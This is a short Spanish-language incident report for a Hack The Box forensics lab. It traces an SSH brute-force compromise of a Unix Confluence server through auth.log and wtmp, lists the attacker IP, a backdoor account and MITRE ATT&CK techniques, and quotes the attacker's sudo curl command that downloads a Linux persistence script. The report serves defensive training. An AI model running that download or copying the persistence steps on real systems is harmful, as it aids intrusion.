Reporte de Análisis: Sherlock - Bruto (HTB)

## 1. Escenario del Incidente
Se investigó un compromiso en un servidor **Confluence** basado en Unix. El objetivo fue rastrear las acciones de un atacante que logró acceso mediante fuerza bruta al servicio SSH y analizar sus tácticas de persistencia y ejecución.

## 2. Resumen de Hallazgos

| Ítem | Información Identificada |
| :--- | :--- |
| **Vector de Ataque** | Fuerza Bruta (SSH) |
| **IP del Atacante** | 65.2.161.68 |
| **Usuario Comprometido** | root |
| **Timestamp de Acceso (wtmp)** | 2024-03-06 06:32:45 |
| **ID de Sesión SSH** | 37 |
| **Cuenta de Persistencia** | cyberjunkie |
| **Comando de Descarga (Sudo)** | /usr/bin/curl https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh |

## 3. Análisis Técnico (Metodología)

### Acceso Inicial y Autenticación
El análisis comenzó en el archivo `auth.log`, donde se identificó un patrón de intentos fallidos masivos provenientes de una única IP. 
Se confirmó el éxito del ataque al encontrar el evento `Accepted password`. Para mayor precisión, se consultó el artefacto `wtmp`, 
que permitió diferenciar los intentos automatizados de la sesión interactiva real establecida por el atacante.

### Persistencia y Elevación de Privilegios
Tras ganar acceso, el atacante ejecutó comandos para crear un nuevo usuario con privilegios de administrador. 
Esta es una técnica clásica de **Persistencia** para mantener el acceso incluso si la contraseña de la cuenta original es cambiada. 
Finalmente, se detectó el uso de `sudo` para descargar herramientas externas, lo cual indica una fase de preparación para acciones posteriores.

## 4. Tácticas MITRE ATT&CK Detectadas
* **Acceso a Credenciales:** T1110 - Brute Force.
* **Persistencia:** T1136.001 - Local Account.
* **Escalada de Privilegios:** T1548.003 - Sudo and Sudo Caching.
